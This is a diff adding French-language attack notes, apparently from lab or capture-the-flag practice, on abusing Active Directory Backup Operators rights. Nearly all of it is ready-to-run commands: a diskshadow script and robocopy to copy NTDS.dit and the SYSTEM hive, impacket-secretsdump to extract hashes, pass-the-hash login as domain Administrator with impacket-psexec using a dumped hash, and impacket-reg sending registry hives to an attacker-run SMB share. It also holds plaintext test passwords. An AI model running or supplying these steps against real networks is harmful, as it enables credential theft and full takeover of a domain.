@@ -1,0 +1,72 @@
+
+Repérer le users dans le groupe BACKUP OPERATOR
+
+A l'aide de BLOODHOUND
+
+
+Sur la machine cible
+![[Pasted image 20260804112838.png]]
+
+![[Pasted image 20260804112913.png]]
+
+
+### Méthode 1 :
+Récupérer les hashs des comptes locaux de la machine et NDTS.dir quand le user les droits suffisants
+```bash 
+netexec smb 10.129.234.71 -u Caroline.Robinson -p 'Password123!' -M backup_operator
+```
+
+![[Pasted image 20260804142050.png]]
+
+
+
+### Méthode  2 : 
+Pour récupérer le NTDS.dit de l'ad 
+```bash 
+nano test.dsh 
+
+set context persistent nowriters
+add volume c: alias pwn
+create
+expose %pwn% z:
+
+unix2dos test.dsh 
+unix2dos: converting file test.dsh to DOS format...
+
+
+cd C:/
+mkdir Temp
+upload test.dsh
+
+diskshadow /s test.dsh
+robocopy /b z:\windows\ntds . ntds.dit
+reg save hklm\system c:\Temp\system
+
+download system
+download ntds.dit
+
+```
+
+
+
+```bash 
+impacket-secretsdump -ntds ntds.dit -system system local
+```
+
+![[Pasted image 20260804120747.png]]
+
+```bash 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
+# Connection sur la machine avec le compte administrator du domain
+impacket-psexec baby.vl/Administrator@10.129.41.212 -hashes 'aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e' 
+```
+![[Pasted image 20260804120935.png]]
+
+
+### Méthode 3 :
+
+```bash 
+impacket-smbserver share $(pwd) -smb2support
+impacket-reg "ignite.local"/"raj":"Password@1"@"192.168.1.11" backup -o '\\192.168.1.17\share'
+pypykatz registry --sam SAM.save SYSTEM.save
+```
